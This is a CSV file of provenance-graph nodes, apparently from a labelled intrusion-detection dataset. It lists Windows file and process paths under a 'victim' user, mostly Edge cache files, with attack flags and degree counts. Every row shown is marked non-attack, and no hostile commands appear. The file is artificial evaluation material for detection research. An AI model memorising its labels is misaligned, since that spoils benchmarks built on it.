uuid,annotation,node_order,is_attack_node,in_degree_subgraph,out_degree_subgraph,total_degree_subgraph,in_degree_full,out_degree_full,total_degree_full
dafac7c0-d807-4dc3-90f9-80595355e391,{'subject': '\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1'},9965,False,0,1,1,0,2,2
cc08e7e1-c54b-4791-8301-7fbf988bc48b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\b9731262-a163-4c1d-80ed-33dc9bdc6a15.tmp'},10007,False,1,1,2,1,1,2
b4ca23b5-5278-4ad2-b75c-1db031dfae88,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State~RF1ba71a.TMP'},10008,False,2,0,2,2,0,2
cfe7832e-0c7a-4154-890a-4a1072ff55a9,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\1f53c9ec-a02a-44c3-b006-d9febf670ef6.tmp'},10082,False,1,1,2,1,1,2
6315fac4-dfad-41c4-b845-6f6a23c408c5,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Preferences~RF1bb10c.TMP'},10083,False,2,0,2,2,0,2
b1d61c37-4e7b-4116-be76-afba7dfdbb5b,{'file': 'C:\\Windows\\Prefetch\\CONSENT.EXE-65F6206D.pf'},10419,False,1,0,1,2,0,2
9878a60a-bd31-4da8-950f-5661a2114759,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\876963dd-d3b6-423d-a1e2-11e0b781a5a9.tmp'},10484,False,1,1,2,1,1,2
af78ae19-8482-420b-8505-f464bb0d5f30,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\Network Persistent State~RF1bf922.TMP'},10485,False,2,0,2,2,0,2
b229abb9-df6b-42a4-b4a8-49bf133f78b9,{'file': 'C:\\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System Tools\\Command Prompt.lnk'},10501,False,2,0,2,2,0,2
1d99b342-14c7-4ca6-a88c-ac5baed5a5d1,{'file': 'C:\\Windows\\System32\\wbem\\WMIC.exe'},10647,False,2,0,2,2,0,2
c005f8d8-3c83-41d9-aadf-d92c4b68965b,{'file': 'WMIC.exe'},10649,False,2,0,2,2,0,2
27e3daad-c4cf-4c46-9872-5ed5282abb6a,{'file': 'C:\\Windows\\System32\\Wbem\\WMIC.exe'},10650,False,2,0,2,2,0,2
948c017c-a609-4e49-a086-f1bd23373473,{'file': '\\Device\\HarddiskVolume1\\Windows\\System32\\wdmaud.drv'},288,False,1,0,1,1,0,1
ba74ac65-4834-4a3c-acfb-3a68fb096eba,{'file': '\\Device\\HarddiskVolume1\\Windows\\System32\\msacm32.drv'},289,False,1,0,1,1,0,1
4d9aa94a-fc35-4728-bf88-d3f023f9bbf1,{'file': '\\Device\\HarddiskVolume1\\Windows\\System32\\bthprops.cpl'},290,False,1,0,1,1,0,1
ce710ac5-1a0d-4a23-9410-7009b87df400,{'file': '\\Device\\HarddiskVolume1\\Windows\\System32\\wscui.cpl'},291,False,1,0,1,1,0,1
58837247-b31d-4902-a6f2-e6bfc3c332fe,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\ScriptCache\\2cc80dabc69f58b6_0'},400,False,1,0,1,1,0,1
82c664e0-1147-454d-9042-21b9048d3095,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\ScriptCache\\2cc80dabc69f58b6_1'},402,False,1,0,1,1,0,1
f0798615-4d79-4c83-8718-d4e8e5824050,{'file': '1:WofCompressedDat'},403,False,1,0,1,1,0,1
2a0e113a-f75a-4e20-bbe0-2f76615e9eca,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_000017'},404,False,1,0,1,1,0,1
bdc8b87d-7dd4-4e34-b5b7-24cae668e387,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_0000a9'},405,False,1,0,1,1,0,1
0d52db09-cfa7-4d76-8333-3a1f2485869a,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\ScriptCache\\f1cdccba37924bda_0'},406,False,1,0,1,1,0,1
555f12d7-2481-417a-a1e6-60493912ecae,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\ScriptCache\\f1cdccba37924bda_1'},407,False,1,0,1,1,0,1
62118519-7913-41b5-b978-9bac1b0f7291,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\e73519daf6970a86_0'},408,False,1,0,1,1,0,1
e6e9b151-99ee-4d2c-a51f-b85498e1ebed,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\e73519daf6970a86_1'},409,False,1,0,1,1,0,1
8e188d0d-6517-439b-ad80-2d202fc7e92f,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_0000aa'},410,False,1,0,1,1,0,1
40573688-37b2-457a-bbd2-f0bcb5ad6103,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\0d1f4537dea09ba2_0'},411,False,1,0,1,1,0,1
0a0493a3-aa66-416f-a3df-9cfbc33f6344,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\0d1f4537dea09ba2_1'},412,False,1,0,1,1,0,1
bafb5d44-f4d2-44ac-bebf-9223aece8824,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\40d0c138bab9b8ee_0'},413,False,1,0,1,1,0,1
6d0703c1-9b91-4850-8a54-0b24fbfa293b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\40d0c138bab9b8ee_1'},414,False,1,0,1,1,0,1
f7fbbe87-0fd4-45e8-adf8-4366c38b3271,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_0000ab'},415,False,1,0,1,1,0,1
b216f84c-7b00-4c34-9678-d65b65c3213b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\e884b832e0c12be1_0'},416,False,1,0,1,1,0,1
e64aa06b-575b-4813-adec-013df2cd42d5,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\e884b832e0c12be1_1'},417,False,1,0,1,1,0,1
8fa939a9-17c9-4f8e-99d4-e0b0b7e12c97,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\517c6c0e0da520ae_0'},418,False,1,0,1,1,0,1
ef2434a0-ecaf-48e7-a12b-ec355b86593a,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\517c6c0e0da520ae_1'},419,False,1,0,1,1,0,1
cb38b9f9-8df5-4f27-827a-30f3eb7cbfb4,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\33e76e10a157b64f_0'},420,False,1,0,1,1,0,1
4d0caa4e-99a1-48e1-a8d7-66f635fa3a21,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\33e76e10a157b64f_1'},421,False,1,0,1,1,0,1
d9dd00be-9142-4ba0-b5b0-fd143b8fe500,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\486826d9e44ad68d_0'},422,False,1,0,1,1,0,1
461a9f8c-7b5c-44cf-96a4-f5131e60925b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\486826d9e44ad68d_1'},423,False,1,0,1,1,0,1
c76be129-a23f-47d3-a9d4-93e45197e81a,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_0000ac'},424,False,1,0,1,1,0,1
76b390be-710e-4467-8eee-a039d1eddfbd,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\e8fadf2f2f42477f_0'},425,False,1,0,1,1,0,1
3f360bcc-0dad-4b1c-b8d9-27e8958cddce,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\e8fadf2f2f42477f_1'},426,False,1,0,1,1,0,1
e2d4ada6-47a2-42b4-a998-f53700e47ce1,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\d21af9d64e4d739f_0'},427,False,1,0,1,1,0,1
bcba4a8f-7647-4833-84b2-dc722a6cc0a8,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\d21af9d64e4d739f_1'},428,False,1,0,1,1,0,1
40d7d68d-7b63-4ead-a61d-e949bb1522b1,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\43efb30f58a26e55_0'},429,False,1,0,1,1,0,1
add1ccbb-2ee8-4684-8244-01052fcdacea,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\43efb30f58a26e55_1'},430,False,1,0,1,1,0,1
4bd5b185-c91d-49e5-98c1-23e38a824631,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_0000ad'},431,False,1,0,1,1,0,1
e31b2317-1504-46a7-9c87-fb3565e71711,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\41678a5fcfd8fb1d_0'},432,False,1,0,1,1,0,1
06c41693-6fce-4268-871d-fba74782b04a,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\41678a5fcfd8fb1d_1'},433,False,1,0,1,1,0,1
790f19f2-2c78-4561-8db3-5c93a2d41c01,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\0f9209db3ff30066_0'},434,False,1,0,1,1,0,1
46a305bf-cdd6-4620-bce9-e8603ced3507,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\0f9209db3ff30066_1'},435,False,1,0,1,1,0,1
5c149c46-3306-4ae6-be21-14f7b8a8b15d,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_0000ae'},436,False,1,0,1,1,0,1
8afb9b7f-a4a6-40fd-8bac-bcbc6c82799d,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\7569a12fd66c47cf_0'},437,False,1,0,1,1,0,1
6ce8359b-95a6-457a-914a-90443950f5aa,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\7569a12fd66c47cf_1'},438,False,1,0,1,1,0,1
8a03368e-d2a5-4214-adf6-59d9ee5bc03b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_0000af'},439,False,1,0,1,1,0,1
fd40592f-ae71-49d8-bfa2-cbd4a604b397,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\0ba94dde998af4fa_0'},440,False,1,0,1,1,0,1
bcd4172e-634e-4f1e-a3df-35c2939ba475,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\0ba94dde998af4fa_1'},441,False,1,0,1,1,0,1
ce26ad61-4ada-4c2d-acee-57d54c06f918,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\ab862aae4ab2e1f1_0'},442,False,1,0,1,1,0,1
e723d052-18ef-4c8a-9647-6d7a1be8eb47,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\ab862aae4ab2e1f1_1'},443,False,1,0,1,1,0,1
e8e3d135-884f-418d-8f7c-c886d3853ee4,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_0000b0'},444,False,1,0,1,1,0,1
1a567be9-706f-4a54-adf2-027a443053b3,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\d13f9a0666db69d2_0'},445,False,1,0,1,1,0,1
54982a3c-5f8c-451c-a639-12b4ef55f3a0,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\d13f9a0666db69d2_1'},446,False,1,0,1,1,0,1
38ad3e02-8b8b-411b-bd65-7db0fa0c7a6f,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\59d11db12add1cd9_0'},447,False,1,0,1,1,0,1
16c21a54-d468-40a0-94fd-fad76ee95f02,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\59d11db12add1cd9_1'},448,False,1,0,1,1,0,1
db9d003c-a2f0-4fb0-ba02-5fd9d35741cb,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\304898f9e47bf481_0'},449,False,1,0,1,1,0,1
4897a9a1-afea-4671-b294-6327a65c8ae6,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\304898f9e47bf481_1'},450,False,1,0,1,1,0,1
74091b66-6439-497c-88ea-62defa238f18,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_0000b1'},451,False,1,0,1,1,0,1
4946780d-7783-41fa-a36b-d3fcbd29b185,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\8af98c3f863d97cf_0'},452,False,1,0,1,1,0,1
d453f1db-409e-49c1-8454-1d10a3bb7f5b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\8af98c3f863d97cf_1'},453,False,1,0,1,1,0,1
fc48f0ed-d900-418d-ad9b-cd65ed7d8377,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_0000b2'},454,False,1,0,1,1,0,1
86168435-c3bd-466b-b392-da082d5d71e9,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\e25299455997ba8b_0'},455,False,1,0,1,1,0,1
bcfaa5e0-d71a-4321-aecf-14d43a6b1168,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\e25299455997ba8b_1'},456,False,1,0,1,1,0,1
4f3b21de-ef0a-4709-a0cd-faa86bc92d2d,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\3b2368130f130653_0'},457,False,1,0,1,1,0,1
7abda821-9bc0-44e2-b470-b9009e618acd,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\3b2368130f130653_1'},458,False,1,0,1,1,0,1
98c47262-5054-4c79-98a5-4cf7e4375d03,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\fbdc8eb591d4753a_0'},459,False,1,0,1,1,0,1
d9d04193-46f1-48ae-969b-7a391e7d0f5b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\fbdc8eb591d4753a_1'},460,False,1,0,1,1,0,1
8011a1ee-6eb6-4322-bc34-70f90e709026,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\c702ca4c9e5e5c84_0'},461,False,1,0,1,1,0,1
a5f0dd7c-276e-4efb-aea0-5bb342b2f99f,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\c702ca4c9e5e5c84_1'},462,False,1,0,1,1,0,1
fb5223fc-9cc7-4f26-9c2d-cd17de7328ed,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_0000b3'},463,False,1,0,1,1,0,1
33dc5c89-9e4d-42c5-88d8-aef61b1b6882,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\a1d7a065a7e60334_0'},464,False,1,0,1,1,0,1
919fe68e-31f5-4977-bb0e-efe4d4493ddf,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\a1d7a065a7e60334_1'},465,False,1,0,1,1,0,1
8daa8306-d44f-40c7-aae7-edf4ae576453,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\abc6f936a44c7530_0'},466,False,1,0,1,1,0,1
c60335bf-b0ef-4f56-9bbf-a9c19a4204cb,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\abc6f936a44c7530_1'},467,False,1,0,1,1,0,1
50a0cc9a-61ed-4358-8029-4ce6363a53c9,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_0000b4'},468,False,1,0,1,1,0,1
c5773601-03a9-4925-8ef3-d62401f061f6,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\d0b548ec66cc0d3f_0'},469,False,1,0,1,1,0,1
becce9f9-0a7c-4cb6-bebc-3ac35ac4d21a,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\d0b548ec66cc0d3f_1'},470,False,1,0,1,1,0,1
6eb76d2f-5638-4aa8-b960-7d6d54b25255,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\2ffffbca04fdceec_0'},471,False,1,0,1,1,0,1
b739a568-3f85-4667-9328-0049a4e4a51c,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\2ffffbca04fdceec_1'},472,False,1,0,1,1,0,1
a4b66330-6ca3-4a97-8a44-c6d8af960a79,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\2cb094917b3288cd_0'},473,False,1,0,1,1,0,1
e13ee146-92e5-454d-9ac5-996cd356e911,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\2cb094917b3288cd_1'},474,False,1,0,1,1,0,1
21d7eaed-3c39-4f14-ab9b-285264e1cbb3,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\ac0fca45321fd75c_0'},475,False,1,0,1,1,0,1
330d160e-3115-46a4-aedc-6d5249d9b2bf,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\ac0fca45321fd75c_1'},476,False,1,0,1,1,0,1
8eb4525c-b93b-4ea3-b710-e26649169317,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\05f9117ade39b35b_0'},477,False,1,0,1,1,0,1
